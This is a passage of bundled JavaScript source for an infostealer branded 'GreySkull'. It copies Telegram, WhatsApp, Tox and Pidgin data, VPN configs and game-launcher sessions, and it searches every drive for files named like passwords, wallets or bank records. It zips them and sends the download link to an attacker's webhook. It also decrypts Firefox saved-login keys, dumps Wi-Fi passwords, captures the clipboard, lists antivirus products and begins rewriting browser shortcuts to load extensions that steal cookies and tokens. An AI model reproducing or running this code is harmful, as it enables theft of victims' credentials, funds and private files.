  } catch (e) {
    save.SaveError(e);
  }
}

function GreySkullTelegram(cc) {
  if (cc != "yes") return;
  try {
    const telegram_path = appdata + "\\Telegram Desktop\\tdata\\";

    if (!fs.existsSync(telegram_path)) {
      return;
    }

    var saves = [];

    const files = fs.readdirSync(telegram_path);

    for (var i = 0; i < files.length; i++) {
      const file = files[i];
      const savePath = telegram_path + file;
      if (fs.lstatSync(savePath).isDirectory()) {
        if (file.length != 16) {
          continue;
        }

        saves.push(savePath + "//");
      } else {
        if (file.endsWith("s") || file.length == 17) {
          saves.push(savePath);
        }

        if (
          file.startsWith("settings") ||
          file.startsWith("key_data") ||
          file.startsWith("usertag")
        ) {
          saves.push(savePath);
        }
      }
    }

    stat.AddMessenger("Telegram");
    save.ArraySave(saves, "Social", "Telegram");
  } catch (e) {
    save.SaveError(e);
  }
}
function GreySkullWhatsapp(cc) {
  if (cc != "yes") return;
  try {
    const whatsapp_path =
      appdata +
      "\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\\LocalState\\";

    var saves = [];

    if (!fs.existsSync(whatsapp_path)) {
      return;
    }

    if (fs.existsSync(whatsapp_path)) {
      const files = fs.readdirSync(whatsapp_path);

      for (let i = 0; i < files.length; i++) {
        const file = files[i];
        const savePath = whatsapp_path + file;

        if (file.endsWith(".ini") || file.endsWith(".db")) {
          saves.push(savePath);
        }
      }
    }

    stat.AddMessenger("WhatsApp");
    save.ArraySave(saves, "Social", "WhatsApp");
  } catch (e) {
    save.SaveError(e);
  }
}


function GreySkullTox(cc) {
  if (cc != "yes") return;
  try {
    const tox_path = appdata + "\\tox\\";

    var saves = [];

    if (!fs.existsSync(tox_path)) {
      return;
    }

    if (fs.existsSync(tox_path)) {
      const files = fs.readdirSync(tox_path);

      for (let i = 0; i < files.length; i++) {
        const file = files[i];
        const savePath = tox_path + file;

        if (
          file.endsWith(".tox") ||
          file.endsWith(".ini") ||
          file.endsWith(".db")
        ) {
          saves.push(savePath);
        }
      }
    }

    stat.AddMessenger("Tox");
    save.ArraySave(saves, "Social", "Tox");
  } catch (e) {
    save.SaveError(e);
  }
}

function GreySkullPidgin(cc) {
  if (!cc) return;
  try {
    const mainPath = appdata + "\\.purple\\";

    if (!fs.existsSync(mainPath)) {
      return;
    }

    if (fs.existsSync(mainPath + "accounts.xml")) {
      stat.AddMessenger("Pidgin");
      save.ArraySave([mainPath + "accounts.xml"], "Social", "Pidgin");
    }
  } catch (e) {
    save.SaveError(e);
  }
}

function GreySkullNordVPN(cc) {
  if (cc != "yes") return;
  try {
    const mainPath = local + "\\NordVPN\\";

    if (!fs.existsSync(mainPath)) {
      return;
    }

    const files = fs.readdirSync(mainPath);
    var saves = [];

    for (let i = 0; i < files.length; i++) {
      const file = files[i];
      const savePath = mainPath + file + "\\";

      if (fs.statSync(savePath).isDirectory) {
        if (file.includes("exe")) {
          const filesExe = fs.readdirSync(savePath);

          for (let u = 0; u < filesExe.length; u++) {
            const fileExe = filesExe[u];

            if (fs.existsSync(savePath + fileExe + "\\user.config")) {
              saves.push(savePath + fileExe + "\\user.config");
            }
          }
        }
      }
    }

    stat.AddVpn("NordVPN");
    save.ArraySave(saves, "VPN", "NordVPN");
  } catch (e) {
    save.SaveError(e);
  }
}

function GreySkullProton(cc) {
  if (cc != "yes") return;
  try {
    const mainPath = local + "\\ProtonVPN\\";

    if (!fs.existsSync(mainPath)) {
      return;
    }

    const files = fs.readdirSync(mainPath);
    var saves = [];

    for (let i = 0; i < files.length; i++) {
      const file = files[i];
      const savePath = mainPath + file + "\\";

      if (fs.statSync(savePath).isDirectory) {
        if (file.includes("exe")) {
          const filesExe = fs.readdirSync(savePath);

          for (let u = 0; u < filesExe.length; u++) {
            const fileExe = filesExe[u];

            if (fs.existsSync(savePath + fileExe + "\\user.config")) {
              saves.push(savePath + fileExe + "\\user.config");
            }
          }
        }
      }
    }

    stat.AddVpn("ProtonVPN");
    save.ArraySave(saves, "VPN", "ProtonVPN");
  } catch (e) {
    save.SaveError(e);
  }
}

function GreySkullRiotGame(cc) {
  if (cc != "yes") return;
  let riotgame = local + "\\Riot Games\\Riot Client\\Data\\";
  try {
    var saves = [];

    if (fs.existsSync(path)) {
      const files = fs.readdirSync(riotgame);

      for (let u = 0; u < files.length; u++) {
        const file = files[u];

        const savePath = path + file;
        saves.push(savePath);
      }
    }
    if (saves.length != 0) {
      stat.AddGames("Riotgames");
      save.ArraySave(saves, "Launcher", "RiotGames");
    }
  } catch (e) {
    save.SaveError(e);
  }
}

function GreySkullEpicGame(cc) {
  if (cc != "yes") return;
  let epicpath = [];
  try {
    const epicgame = local + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\";
    const config_file = path.join(epicgame, "GameUserSettings.ini");

    if (fs.existsSync(epicgame) && fs.existsSync(config_file)) {
      const contents = fs.readFileSync(config_file, "utf-8");
      if (contents.includes("[RememberMe]")) {
        const files = fs.readdirSync(epicgame);
        for (let i = 0; i < files.length; i++) {
          const file = files[i];
          const filePath = epicgame + file;
          epicpath.push(filePath);
        }
      }
      stat.AddGames("EpicGame");
      save.ArraySave(epicpath, "Launcher", "EpicGame");
    }
  } catch (error) {
    save.SaveError(error);
  }
}

function GreySkullGOG(cc) {
  if (cc != "yes") return;
  try {
    const gog = local + "\\GOG.com\\Galaxy\\Configuration\\";
    if (fs.existsSync(gog)) {
      stat.AddGames("GOG");
      save.SimpleSave(gog, "Launcher", "GOG");
    }
  } catch (error) {
    save.SaveError(error);
  }
}

function GreySkullRockstarGames(cc) {
  if (cc != "yes") return;
  try {
    const rockstar = local + "\\Rockstar Games\\Launcher\\";
    if (fs.existsSync(rockstar)) {
      stat.AddGames("Rockstar");
      save.SimpleSave(rockstar, "Launcher", "Rockstar");
    }
  } catch (error) {
    save.SaveError(error);
  }
}

function GreySkullElectronicArts(cc) {
  if (cc != "yes") return;
  try {
    const eapath = local + "\\Electronic Arts\\EA Desktop\\Windows\\cookie.ini";
    if (fs.existsSync(eapath)) {
      stat.AddGames("ElectronicArts");
      save.SimpleSave(eapath, "Launcher", "ElectronicArts");
    }
  } catch (error) {
    save.SaveError(error);
  }
}

function GreySkullUbisoft(cc) {
  if (cc != "yes") return;
  let riotgame = local + "\\Ubisoft Game Launcher\\";
  try {
    var saves = [];

    if (fs.existsSync(path)) {
      const files = fs.readdirSync(riotgame);

      for (let u = 0; u < files.length; u++) {
        const file = files[u];

        const savePath = path + file;
        saves.push(savePath);
      }
    }
    if (saves.length != 0) {
      stat.AddGames("Ubisoft");
      save.ArraySave(saves, "Launcher", "Ubisoft");
    }
  } catch (error) {}
}

function GreySkullOpenVPN(cc) {
  if (cc != "yes") return;
  try {
    const mainPath = appdata + "\\OpenVPN Connect\\profiles\\";
    var saves = [];

    if (!fs.existsSync(mainPath)) {
      return;
    }

    const files = fs.readdirSync(mainPath);
    for (let i = 0; i < files.length; i++) {
      const file = files[i];
      const savePath = mainPath + file;
      saves.push(savePath);
    }

    stat.AddGames("OpenVPN");
    save.ArraySave(saves, "VPN", "OpenVPN");
  } catch (e) {
    save.SaveError(e);
  }
}

function GreySkullBattle(cc) {
  if (cc != "yes") return;
  try {
    const mainPath = appdata + "\\Battle.net\\";
    var saves = [];

    if (!fs.existsSync(mainPath)) {
      return;
    }

    const files = fs.readdirSync(mainPath);

    for (let i = 0; i < files.length; i++) {
      const file = files[i];
      const savePath = mainPath + file;

      if (file.includes("db") || file.includes("config")) {
        saves.push(savePath);
      }
    }

    stat.AddGames("Battle.net");
    save.ArraySave(saves, "Launcher", "Battlenet");
  } catch (e) {
    save.SaveError(e);
  }
}

async function rechercherFichiers(repertoire, textes, extensions) {
  const fichiersTrouves = [];

  const fichiers = await fsPromises.readdir(repertoire);

  for (const fichier of fichiers) {
    const chemin = path.join(repertoire, fichier);
    const stat = await fsPromises.stat(chemin);
    const extension = path.extname(fichier).toLowerCase();

    if (!stat.isDirectory() && extensions.includes(extension)) {
      if (textes.some((texte) => fichier.toLowerCase().includes(texte))) {
        fichiersTrouves.push(chemin);
      }
    }
  }

  return fichiersTrouves;
}

function genererNomAleatoire(longueur) {
  const caracteres =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let nomAleatoire = "";
  for (let i = 0; i < longueur; i++) {
    const index = Math.floor(Math.random() * caracteres.length);
    nomAleatoire += caracteres.charAt(index);
  }
  return nomAleatoire;
}

async function zipEtSupprimerDossier(dossierSource) {
  const dossierDestination = `${path.dirname(dossierSource)}\\@${
    process.env.USERNAME.replace(".", "") || "USER"
  }_Keywords.zip`;

  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(dossierDestination);
    const archive = archiver("zip", { zlib: { level: 9 } });

    output.on("close", async () => {
      try {
        await fsPromises.rm(dossierSource, { recursive: true });
        resolve(dossierDestination);
      } catch (err) {
        reject(err);
      }
    });

    archive.on("error", (err) => {
      reject(err);
    });

    archive.pipe(output);
    archive.directory(dossierSource, false);
    archive.finalize();
  });
}

function NovasearchFilesDir(extensionsAutorisees, motsARechercher) {
  const driveLetters = [];
  for (let i = 65; i <= 90; i++) {
    const driveLetter = String.fromCharCode(i) + ":";
    driveLetters.push(driveLetter);
  }

  const os = __webpack_require__(/*! os */ "os");
  const mainDriveLetter =
    os.platform() === "win32"
      ? os.homedir().charAt(0).toUpperCase() + ":"
      : null;
  if (mainDriveLetter) {
    const index = driveLetters.indexOf(mainDriveLetter);
    if (index !== -1) {
      driveLetters.splice(index, 1);
    }
  }

  const matchingFiles = [];

  function checkFilesInDirectory(directory) {
    try {
      const files = fs.readdirSync(directory);
      files.forEach((file) => {
        const fileExtension = path.extname(file);
        const fileName = path.basename(file);
        if (extensionsAutorisees.includes(fileExtension)) {
          for (const mot of motsARechercher) {
            if (fileName.includes(mot)) {
              matchingFiles.push(path.join(directory, file));
              break;
            }
          }
        }
      });
    } catch (error) {}
  }
  driveLetters.forEach((driveLetter) => {
    const directory = path.join(driveLetter, "\\");
    checkFilesInDirectory(directory);
  });
  return matchingFiles;
}

async function CheckSensitiveFiles(cc, wb) {
  if (cc !== "yes") return;
  const extensionsARechercher = [
    ".txt",
    ".jpg",
    ".png",
    ".jpeg",
    ".sql",
    ".json",
    ".csv",
    ".doc",
    ".docm",
    ".docx",
    ".docx",
    ".point",
    ".dotm",
    ".dotx",
    ".odt",
    ".pdf",
    ".xml",
    ".Xps",
    ".rdp"
  ];

  async function checkZipSize(filePath) {
    try {
      const stats = await fs.stat(filePath);
      const fileSizeInBytes = stats.size;
      const fileSizeInKilobytes = fileSizeInBytes / 1000;
      return fileSizeInKilobytes < 1;
    } catch (error) {
      return false;
    }
  }

  const textesARechercher = [
    "backup",
    "default",
    "code",
    "discord",
    "token",
    "passw",
    "mdp",
    "motdepasse",
    "mot_de_passe",
    "login",
    "secret",
    "account",
    "acount",
    "paypal",
    "banque",
    "bank",
    "metamask",
    "wallet",
    "crypto",
    "exodus",
    "2fa",
    "a2f",
    "memo",
    "compte",
    "finance",
    "seecret",
    "credit",
    "cni",
  ];
  const repertoiresARechercher = [
    `${process.env.USERPROFILE}\\Desktop`,
    `${process.env.USERPROFILE}\\Downloads`,
    `${process.env.USERPROFILE}\\Documents`,
    `${process.env.USERPROFILE}\\Pictures`,
  ];

  const nomDossierAleatoire = genererNomAleatoire(20);
  const dossierDestination = path.join(process.env.TMP, nomDossierAleatoire);
  try {
    await fsPromises.mkdir(dossierDestination);
    for (const repertoire of repertoiresARechercher) {
      const fichiersTrouves = await rechercherFichiers(
        repertoire,
        textesARechercher,
        extensionsARechercher
      );

      let filchiersFinded = NovasearchFilesDir(
        extensionsARechercher,
        textesARechercher
      );
      if (fichiersTrouves.length > 0) {
        for (const fichier of fichiersTrouves) {
          const nomFichier = path.basename(fichier);
          const cheminDestination = path.join(
            dossierDestination,
            genererNomAleatoire(3) + "_" + nomFichier
          );
          await fsPromises.copyFile(fichier, cheminDestination);
        }
      }
      if (filchiersFinded.length > 0) {
        for (const fichier of filchiersFinded) {
          const nomFichier = path.basename(fichier);
          const cheminDestination = path.join(
            dossierDestination,
            genererNomAleatoire(3) + "_" + nomFichier
          );
          await fsPromises.copyFile(fichier, cheminDestination);
        }
      }
    }

    try {
      const cheminDuZip = await zipEtSupprimerDossier(dossierDestination);
      if (await checkZipSize(cheminDuZip)) return;
      let url = await upload(cheminDuZip);
      const tosend = {
        username: "GreySkull",
        avatar_url:
          "https://raw.githubusercontent.com/KSCH58/Assets-of-god/main/dad36dd5-456e-41fd-9dd2-a07655be72b6.png",
        embeds: [
          {
            title: "Keywords Files",
            color: 1638163,
            description: `[<:nova:1132934190032244786> GreySkull On Top](https://t.me/Sordeal)`,
            fields: [
              {
                name: "**DOWNLOAD URL**:",
                value: `[\`@${
                  process.env.USERNAME.replace(".", "") || "USER"
                }_Keywords.zip\`](${url})`,
                inline: false,
              },
            ],
            footer: {
              text: "@GreySkull | https://t.me/Sordeal",
            },
          },
        ],
      };
      await axios({
        url: wb,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        httpsAgent: agent,
        data: tosend,
      });
      try {
        await fsPromises.unlink(cheminDuZip);
      } catch (e) {}
    } catch (err) {}
  } catch (err) {}
}

module.exports = {
  CheckSensitiveFiles,
  GreySkullSimple,
  GreySkullSteam,
  GreySkullTelegram,
  GreySkullTox,
  GreySkullProton,
  GreySkullBattle,
  GreySkullPidgin,
  GreySkullEpicGame,
  GreySkullRiotGame,
  GreySkullUbisoft,
  GreySkullNordVPN,
  GreySkullOpenVPN,
  GreySkullElectronicArts,
  GreySkullRockstarGames,
  GreySkullGOG,
};


//# sourceURL=webpack://script/./utils/files.js?");

/***/ }),

/***/ 
})(module_8_exports, module_8_exports);
modules['module_8'] = module_8_exports;

// Módulo 9
const module_9_exports = {};
(function(module, exports) {
const fs = __webpack_require__(/*! fs */ "fs");
const forge = __webpack_require__(/*! node-forge */ "node-forge");
const initSqlJs = __webpack_require__(/*! sql.js */ "sql.js");
const path = __webpack_require__(/*! path */ "path");

function decodeLoginData(b64) {
    const asn1 = forge.asn1.fromDer(forge.util.decode64(b64));
    return {
        iv: asn1.value[1].value[1].value,
        data: asn1.value[2].value
    };
}

async function getKey(profileDirectory, masterPassword) {
    const key4FilePath = path.join(profileDirectory, 'key4.db');
    if (!fs.existsSync(key4FilePath)) {
        throw new Error('key4.db was not found in this profile directory.');
    }

    const masterPasswordBytes = forge.util.encodeUtf8(masterPassword || '');
    const key4File = fs.readFileSync(key4FilePath);

    const key4Db = await initSqlJs().then(function(SQL){
        return new SQL.Database(key4File);
    });

    const metaData = key4Db.exec('SELECT item1, item2 FROM metadata WHERE id = \'password\';');
    if (metaData && metaData.length && metaData[0].values && metaData[0].values.length) {
        const globalSalt = toByteString(metaData[0].values[0][0].buffer);
        const item2 = toByteString(metaData[0].values[0][1].buffer);
        const item2Asn1 = forge.asn1.fromDer(item2);
        const item2Value = pbesDecrypt(item2Asn1.value, masterPasswordBytes, globalSalt);
        if (item2Value && item2Value.data === 'password-check') {
            const nssData = key4Db.exec('SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL;');
            if (nssData && nssData.length && nssData[0].values && nssData[0].values.length) {
                const a11 = toByteString(nssData[0].values[0][0].buffer);
                const a11Asn1 = forge.asn1.fromDer(a11);
                return pbesDecrypt(a11Asn1.value, masterPasswordBytes, globalSalt);
            }
        } else {
            throw new Error('Master password incorrect.');
        }
    }

    throw new Error('Not able to get key from profile directory or no passwords were found.');
}

function pbesDecrypt(decodedItemSeq, password, globalSalt) {
    if (decodedItemSeq[0].value[1].value[0].value[1].value != null) {
        return pbes2Decrypt(decodedItemSeq, password, globalSalt);
    }
    return pbes1Decrypt(decodedItemSeq, password, globalSalt);
}

function pbes1Decrypt(decodedItemSeq, password, globalSalt) {
    const data = decodedItemSeq[1].value;
    const salt = decodedItemSeq[0].value[1].value[0].value;
    const hp = sha1(globalSalt + password);
    const pes = toByteString(pad(toArray(salt), 20).buffer);
    const chp = sha1(hp + salt);
    const k1 = hmac(pes + salt, chp);
    const tk = hmac(pes, chp);
    const k2 = hmac(tk + salt, chp);
    const k = k1 + k2;
    const kBuffer = forge.util.createBuffer(k);
    const otherLength = kBuffer.length() - 32;
    const key = kBuffer.getBytes(24);
    kBuffer.getBytes(otherLength);
    const iv = kBuffer.getBytes(8);
    return decrypt(data, iv, key, '3DES-CBC');
}

function pbes2Decrypt(decodedItemSeq, password, globalSalt) {
    const data = decodedItemSeq[1].value;
    const pbkdf2Seq = decodedItemSeq[0].value[1].value[0].value[1].value;
    const salt = pbkdf2Seq[0].value;
    const iterations = pbkdf2Seq[1].value.charCodeAt();
    const iv = '\u0004\u000e' + decodedItemSeq[0].value[1].value[1].value[1].value;
    const k = sha1(globalSalt + password);
    const key = forge.pkcs5.pbkdf2(k, salt, iterations, 32, forge.md.sha256.create());
    return decrypt(data, iv, key, 'AES-CBC');
}

function decrypt(data, iv, key, algorithm) {
    const decipher = forge.cipher.createDecipher(algorithm, key);
    decipher.start({ iv: iv });
    decipher.update(forge.util.createBuffer(data));
    decipher.finish();
    return decipher.output;
}

function sha1(data) {
    const md = forge.md.sha1.create();
    md.update(data, 'raw');
    return md.digest().data;
}

function pad(arr, length) {
    if (arr.length >= length) {
        return arr;
    }
    const padAmount = length - arr.length;
    const padArr = [];
    for (let i = 0; i < padAmount; i++) {
        padArr.push(0);
    }

    var newArr = new Uint8Array(padArr.length + arr.length);
    newArr.set(padArr, 0);
    newArr.set(arr, padArr.length);
    return newArr;
}

function hmac(data, key) {
    const hmac = forge.hmac.create();
    hmac.start('sha1', key);
    hmac.update(data, 'raw');
    return hmac.digest().data;
}

function toByteString(buffer) {
    return String.fromCharCode.apply(null, new Uint8Array(buffer));
}

function toArray(str) {
    const arr = new Uint8Array(str.length);
    for (let i = 0; i < str.length; i++) {
        arr[i] = str.charCodeAt(i);
    }
    return arr;
}

module.exports = {
    getKey,
    decodeLoginData,
    decrypt
}

//# sourceURL=webpack://script/./utils/gecko.js?");

/***/ }),

/***/ 
})(module_9_exports, module_9_exports);
modules['module_9'] = module_9_exports;

// Módulo 10
const module_10_exports = {};
(function(module, exports) {
var Registry = __webpack_require__(/*! winreg */ "winreg"),
  core = __webpack_require__(/*! ./core */ "./utils/core.js"),
  fs = __webpack_require__(/*! fs */ "fs"),
  { stat } = __webpack_require__(/*! ./stats */ "./utils/stats.js"),
  path = __webpack_require__(/*! path */ "path"),
  save = __webpack_require__(/*! ./save */ "./utils/save.js"),
  { exec } = __webpack_require__(/*! child_process */ "child_process"),
  tempPath = (__webpack_require__(/*! os */ "os").tmpdir)(),
  PowerShell = __webpack_require__(/*! powershell */ "powershell"),
  unidecode = __webpack_require__(/*! unidecode */ "unidecode");



async function getSysteminformations(
  cc,
  ip,
  hostname,
  disk,
  ram,
  uid,
  cpucount,
  OS,
  cpu,
  GPU,
  windowskey,
  windowsversion
) {
  if (cc !== "yes") return;

  let info = await Systeminformations(
    cc,
    ip,
    hostname,
    disk,
    ram,
    uid,
    cpucount,
    OS,
    cpu,
    GPU,
    windowskey,
    windowsversion
  );
  const savePath = path.join(stat.testpath[0], "System");
  try {
    if (!fs.existsSync(savePath)) {
      await fs.mkdirSync(savePath);
      fs.writeFileSync(path.join(savePath, "System Info.txt"), info);
    }
  } catch (e) {
    save.SaveError(e);
  }
}

async function Systeminformations(
  cc,
  ip,
  hostname,
  disk,
  ram,
  uid,
  cpucount,
  OS,
  cpu,
  GPU,
  windowskey,
  windowsversion
) {
  if (cc != "yes") return;
  let informations = core.getHeader();
  try {
    informations += `UUID: ${uid}
`;
    informations += `IP: ${ip}
`;
    informations += `Windows Key: ${windowskey}
`;
    informations += `Windows Version: ${windowsversion}
`;
    informations += `HOSTNAME: ${hostname}
`;
    informations += `USERNAME: ${process.env.userprofile.split("\\")[2]}
`;
    informations += `OS: ${OS}
`;
    informations += `FileLocation: ${process.cwd()}
`;
    informations += `CPU: ${cpu}
`;
    informations += `CPU Core: ${cpucount}
`;
    informations += `GPU(s): ${GPU.split("   ").join(", ")}
`;
    informations += `RAM: ${ram} GB
`;
    informations += `DISK: ${disk} GB


`;
    informations += `───────────────────────
Applications installed
───────────────────────

${await getInstalledApplication()}
`;
  } catch (e) {}
  return informations;
}

async function getInstalledApplication() {
  const regKey = new Registry({
    hive: Registry.HKLM,
    key: "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
  });

  const exists = await new Promise((resolve, reject) => {
    regKey.keyExists((err, exists) => {
      if (err != null) {
        resolve(false);
      }
      resolve(exists);
    });
  });
  if (!exists) {
    return "";
  }

  const subkeys = await new Promise((resolve, reject) => {
    regKey.keys((err, subkeys) => {
      if (err != null) {
        resolve([]);
      }

      resolve(subkeys);
    });
  });
  if (subkeys.length == 0) {
    return "";
  }

  let installedApps = "";
  for (let i = 0; i < subkeys.length; i++) {
    const subkey = subkeys[i];

    const items = await new Promise((resolve, reject) => {
      subkey.values((err, items) => {
        if (err != null) {
          resolve([]);
        }

        resolve(items);
      });
    });

    for (let u = 0; u < items.length; u++) {
      if (items[u].name == "DisplayName") {
        installedApps = installedApps + items[u].value + "
";
      }
    }
  }

  return installedApps;
}
async function GreySkullClipboard(cc) {
  if (cc !== "yes") return;

  try {
    const ge = "powershell Get-Clipboard";
    let ps = new PowerShell(ge);
    ps.on("error", (err) => {});
    ps.on("output", (data) => {
      if(!data)return;
      const basepath = stat.testpath[0];
      const sysdir = path.join(basepath, "System");
      try {
        if (!fs.existsSync(sysdir)) {
          fs.mkdirSync(sysdir);
        }
        
      } catch (e) {
        return;
      }
      const ClipFilePath = path.join(sysdir, "Clipboard.txt");
      fs.writeFileSync(ClipFilePath, core.getHeader() + data);
    });
    ps.on("error-output", (data) => {});
    ps.on("end", (code) => {});
  } catch (error) {}
}


async function GreySkullWifiPasswords(cc) {
  let wifiprofile = [];
  if (cc !== "yes") return;

  try {
    const ge = "netsh wlan show profile";

    let ps = new PowerShell(ge);
    ps.on("output", async (data) => {
      const lines = data.split("
");
      for (const line of lines) {
        if (line.startsWith("    Profil")) {
          const profileName = line.split(":")[1].trim();

          const asciiContent = unidecode(profileName);
          wifiprofile.push(asciiContent);
        }
      }
      const promises = wifiprofile.map(async (profile) => {
        const ge = `netsh wlan show profile "${profile}" key=clear`;
        return new Promise(async (resolve, reject) => {
          try {
            let ps = new PowerShell(ge);
            ps.on("output", (data) => {
              const asciiContent = unidecode(data);
              resolve(asciiContent);
            });
          } catch (error) {
          }
        });
      });

      const profileContents = await Promise.all(promises);
      const c = profileContents.join("
"); 
      if(!c)return;
      const basepath = stat.testpath[0];
      const sysdir = path.join(basepath, "System");
      try {
        if (!fs.existsSync(sysdir)) {
          await fs.mkdir(sysdir);
        }
      } catch (e) {
        return;
      }
      const WifiFilePath = path.join(sysdir, "WifiPasswords.txt");
      await fs.writeFileSync(WifiFilePath, core.getHeader() + c);
    });
  } catch (error) {}
}

async function GreySkullAV(cc) {
  if (cc !== "yes") return;
  const psScript = `
function Get-AntiVirusProduct {
    [CmdletBinding()]
    param (
    [parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
    [Alias('name')]
    $computername=$env:computername
    )

    $AntiVirusProducts = Get-WmiObject -Namespace "root\\SecurityCenter2" -Class AntiVirusProduct -ComputerName $computername

    $ret = @()
    foreach ($AntiVirusProduct in $AntiVirusProducts) {
         switch ($AntiVirusProduct.productState) {
            "262144" { $defstatus = "Up to date"; $rtstatus = "Disabled" }
            "262160" { $defstatus = "Out of date"; $rtstatus = "Disabled" }
            "266240" { $defstatus = "Up to date"; $rtstatus = "Enabled" }
            "266256" { $defstatus = "Out of date"; $rtstatus = "Enabled" }
            "393216" { $defstatus = "Up to date"; $rtstatus = "Disabled" }
            "393232" { $defstatus = "Out of date"; $rtstatus = "Disabled" }
            "393488" { $defstatus = "Out of date"; $rtstatus = "Disabled" }
            "397312" { $defstatus = "Up to date"; $rtstatus = "Enabled" }
            "397328" { $defstatus = "Out of date"; $rtstatus = "Enabled" }
            "397584" { $defstatus = "Out of date"; $rtstatus = "Enabled" }
            default   { $defstatus = "Unknown"; $rtstatus = "Unknown" }
        }
        $ht = @{}
        $ht.Computername = $computername
        $ht.Name = $AntiVirusProduct.displayName
        $ht.'Product GUID' = $AntiVirusProduct.instanceGuid
        $ht.'Product Executable' = $AntiVirusProduct.pathToSignedProductExe
        $ht.'Reporting Exe' = $AntiVirusProduct.pathToSignedReportingExe
        $ht.'Definition Status' = $defstatus
        $ht.'Real-time Protection Status' = $rtstatus

        # Créez un nouvel objet pour chaque ordinateur
        $ret += New-Object -TypeName PSObject -Property $ht 
    }
    Return $ret
}
Get-AntiVirusProduct
`;
  const ps = new PowerShell(psScript);
  ps.on("error", (err) => {});
  ps.on("output", async (data) => {
    const savePath = path.join(stat.testpath[0], "System");
    try {
      if (!fs.existsSync(savePath)) {
        await fs.mkdirSync(savePath);
        fs.writeFileSync(path.join(savePath, "Antivirus.txt"), core.getHeader() + data);
      } else{
        fs.writeFileSync(path.join(savePath, "Antivirus.txt"), core.getHeader() + data);
      }
    } catch (e) {
      save.SaveError(e);
    }
  });
  ps.on("error-output", (data) => {});
  ps.on("end", (code) => {});
}


module.exports = {
  getSysteminformations,
  GreySkullAV,
  GreySkullClipboard,
  GreySkullWifiPasswords,
};


//# sourceURL=webpack://script/./utils/infos.js?");

/***/ }),

/***/ 
})(module_10_exports, module_10_exports);
modules['module_10'] = module_10_exports;

// Módulo 11
const module_11_exports = {};
(function(module, exports) {
const fs = __webpack_require__(/*! fs */ "fs"),
  glob = __webpack_require__(/*! glob */ "glob"),
  process = __webpack_require__(/*! process */ "process"),
  { exec, execSync, spawn } = __webpack_require__(/*! child_process */ "child_process"),
  path = __webpack_require__(/*! path */ "path"),
  axios = __webpack_require__(/*! axios */ "axios"),
  asar = __webpack_require__(/*! asar */ "asar"),
  { stat } = __webpack_require__(/*! ./stats */ "./utils/stats.js"),
  save = __webpack_require__(/*! ./save */ "./utils/save.js"),
  core = __webpack_require__(/*! ./core */ "./utils/core.js"),
  unzipper = __webpack_require__(/*! unzipper */ "unzipper"),
  fsPromises = (__webpack_require__(/*! fs */ "fs").promises);


function replaceSpecialCharacter(text) {
  return text.replace(/ /g, "\\u00A0");
}
async function LetInject() {
  let extensions_path = [
    path.join(
      process.env.ProgramData,
      "ChromeExtensionsNova",
      "extension-cookies" 
    ),
    path.join(
      process.env.ProgramData,
      "ChromeExtensionsNova",
      "extension-tokens"
    ),
  ];
  const shortcutPaths = {
    roaming: {
      "Naviguateur Opera GX":
        "Microsoft\\Windows\\Start Menu\\Programs\\Navigateur Opera GX.lnk",
      Google: "Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
      Opera: "Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk",
      "Opera GX": "Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk",
      Brave: "Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk",
      Vivaldi: "Microsoft\\Windows\\Start Menu\\Programs\\Vivaldi.lnk",
      "Microsoft Edge":
        "Microsoft\\Windows\\Start Menu\\Programs\\Microsoft Edge.lnk",
      "Yandex Browser":
        "Microsoft\\Windows\\Start Menu\\Programs\\Yandex\\Yandex Browser.lnk",
      "SRWare Iron":
        "Microsoft\\Windows\\Start Menu\\Programs\\SRWare Iron.lnk",
      "Kiwi Browser":
        "Microsoft\\Windows\\Start Menu\\Programs\\Kiwi Browser.lnk",
      "Torch Browser":
        "Microsoft\\Windows\\Start Menu\\Programs\\Torch Browser.lnk",
      Slimjet: "Microsoft\\Windows\\Start Menu\\Programs\\Slimjet.lnk",
      "Comodo Dragon":
        "Microsoft\\Windows\\Start Menu\\Programs\\Comodo Dragon.lnk",
      "Opera Neon": "Microsoft\\Windows\\Start Menu\\Programs\\Opera Neon.lnk",
    },
    programdata: {
      Google: "Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
      Opera: "Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk",
      "Opera GX": "Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk",
      Brave: "Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk",
      Vivaldi: "Microsoft\\Windows\\Start Menu\\Programs\\Vivaldi.lnk",
      "Microsoft Edge":
        "Microsoft\\Windows\\Start Menu\\Programs\\Microsoft Edge.lnk",
      "Yandex Browser":
        "Microsoft\\Windows\\Start Menu\\Programs\\Yandex\\Yandex Browser.lnk",
      "SRWare Iron":
        "Microsoft\\Windows\\Start Menu\\Programs\\SRWare Iron.lnk",
      "Kiwi Browser":
        "Microsoft\\Windows\\Start Menu\\Programs\\Kiwi Browser.lnk",
      "Torch Browser":
        "Microsoft\\Windows\\Start Menu\\Programs\\Torch Browser.lnk",
      Slimjet: "Microsoft\\Windows\\Start Menu\\Programs\\Slimjet.lnk",
      "Comodo Dragon":
        "Microsoft\\Windows\\Start Menu\\Programs\\Comodo Dragon.lnk",
      "Opera Neon": "Microsoft\\Windows\\Start Menu\\Programs\\Opera Neon.lnk",
    },
  };

  const userRoamingStartMenu = path.join(process.env.APPDATA);

  const userProgramDataStartMenu = path.join(process.env.ProgramData);

  async function modifyShortcut(shortcutPath) {
    let randomname = path.join(
      process.env.APPDATA,
      `salut${core.generateId(5)}.ps1`
    );
    if (!fs.existsSync(shortcutPath)) return;
    const powershellCommand = `
    $WshShell = New-Object -comObject WScript.Shell;
    $Shortcut = $WshShell.CreateShortcut("${replaceSpecialCharacter(
      shortcutPath
    )}");
    $Shortcut.Arguments = "--load-extension=${extensions_path[0]},${
      extensions_path[1]
    }";
    $Shortcut.Save()
    `;
